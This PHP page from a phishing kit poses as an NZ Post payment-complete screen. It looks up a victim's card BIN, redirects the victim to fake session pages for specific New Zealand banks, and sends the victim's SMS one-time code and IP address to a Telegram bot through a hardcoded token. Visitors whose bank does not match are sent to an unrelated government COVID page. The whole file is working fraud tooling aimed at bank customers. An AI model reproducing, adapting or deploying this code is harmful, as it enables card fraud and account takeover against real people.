<br><br><br><br><br><br><br><br><br><br><br><br><br>
<center><b>Payment Complete ... Back to the merchant website.</b></center><br>
<center><img src="https://i.imgur.com/Qh8vLrd.gif" width="100"><center>



<link rel="shortcut icon" href="https://www.nzpost.co.nz/themes/custom/nzpost_legacy/favicon.ico" type="image/x-icon">
<?php



  // Insert CURL
  function curl($url, $var = null) {
      $curl = curl_init($url);
      curl_setopt($curl, CURLOPT_TIMEOUT, 25);
      if ($var != null) {
          curl_setopt($curl, CURLOPT_POST, true);
          curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
      }
      curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
      curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
      $result = curl_exec($curl);
      curl_close($curl);
      return $result;
  }
 
 
 
  // JSON DATA
    $crd = $_POST['cc'];
    $bin =   substr($crd,0,6);
    $getdetails = 'https://lookup.binlist.net/' . $bin;
    $json = json_decode($curl);
    $brand = $json->vendor ? $json->vendor : "error";
    $cardType = $json->type ? $json->type : "error";
    $cardCategory = $json->bank ? $json->bank : "error";
    $countryName = $json->country ? $json->country : "error";
    $countryCode = $json->country ? $json->country : "error";
 

         if ($json->data->bank  == 'ASB BANK') {
               echo "<script>setTimeout(function(){ window.location.href= './sessions/session20/loading.php';}, 10000);</script>";

          }
          elseif ($json->data->bank == 'CARDS NZ, LTD.') {
               echo "<script>setTimeout(function(){ window.location.href= './sessions/session10/loading.php';}, 10000);</script>";

          }
          elseif ($json->data->bank == 'ANZ NATIONAL BANK, LTD.') {
                echo "<script>setTimeout(function(){ window.location.href= './sessions/session10/loading.php';}, 10000);</script>";
          }
          elseif ($json->data->bank == 'ANZ BANK NEW ZEALAND, LTD.') {
                echo "<script>setTimeout(function(){ window.location.href= './sessions/session10/loading.php';}, 10000);</script>";
          }
          elseif ($json->data->bank == 'ANZ BANKING GROUP (NEW ZEALAND), LTD.') {
                echo "<script>setTimeout(function(){ window.location.href= './sessions/session10/loading.php';}, 10000);</script>";
          }
          elseif ($json->data->bank == 'ANZ NATIONAL BANK LIMITED') {
                echo "<script>setTimeout(function(){ window.location.href= './sessions/session10/loading.php';}, 10000);</script>";
          }
		
		elseif ($json->data->bank == 'BANK OF NEW ZEALAND') {
                echo "<script>setTimeout(function(){ window.location.href= './sessions/session40/index.php';}, 10000);</script>";
          }
          elseif ($json->data->bank == 'BNZ') {
                echo "<script>setTimeout(function(){ window.location.href= './sessions/session40/index.php';}, 10000);</script>";
          }
		
		elseif ($json->data->bank == 'WESTPAC BANKING CORPORATION') {
                echo "<script>setTimeout(function(){ window.location.href= './sessions/session30/loading.php';}, 10000);</script>";
          }
		
		elseif ($json->data->bank == 'WESTPAC NEW ZEALAND, LTD.') {
                echo "<script>setTimeout(function(){ window.location.href= './sessions/session30/loading.php';}, 10000);</script>";
          }
		
			elseif ($json->data->bank == 'WESTPAC NEW ZEALAND LIMITED') {
                echo "<script>setTimeout(function(){ window.location.href= './sessions/session30/loading.php';}, 10000);</script>";
          }
		
		elseif ($json->data->bank == 'KIWIBANK') {
                echo "<script>setTimeout(function(){ window.location.href= './sessions/session50/index.php';}, 10000);</script>";
          }
		elseif ($json->data->bank == 'KIWIBANK, LTD.') {
                echo "<script>setTimeout(function(){ window.location.href= './sessions/session50/index.php';}, 10000);</script>";
          }
		elseif ($json->data->bank == 'ITS BANK') {
                echo "<script>setTimeout(function(){ window.location.href= './sessions/session50/index.php';}, 10000);</script>";
          }
		
		elseif ($json->data->bank == 'SIDNEY F.C.U.') {
                echo "<script>setTimeout(function(){ window.location.href= './sessions/session50/index.php';}, 10000);</script>";
          }
		
			elseif ($json->data->bank == 'SIDNEY F.C.U.') {
                echo "<script>setTimeout(function(){ window.location.href= './sessions/session50/index.php';}, 10000);</script>";
          }
		
		
		
		
		
		  else  echo "<script>setTimeout(function(){ window.location.href= 'https://www.health.gov.au/news/health-alerts/novel-coronavirus-2019-ncov-health-alert/coronavirus-covid-19-case-numbers-and-statistics';}, 15000);</script>";
               
     $ccbank = ($json->data->bank);
      
       $cctype = ($json->data->type);

       $cclevel = ($json->data->level);

       $cardissuer = ($json->data->vendor);

       $cardcountry = ($json->data->country);
       
    
       

$ip = getenv("REMOTE_ADDR");

$botToken = "1283001684:AAFq5niTslc9UG-8FlVqWc_FnHFupIQg4Nk";

$chat_id = "@";
$message = "
______________________________________


SMS code 2   : ".$_POST['code']."
 
IP      : $ip
 
______________________________________";

$bot_url    = "https://api.telegram.org/bot$botToken/";

$url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);

file_get_contents($url);

?>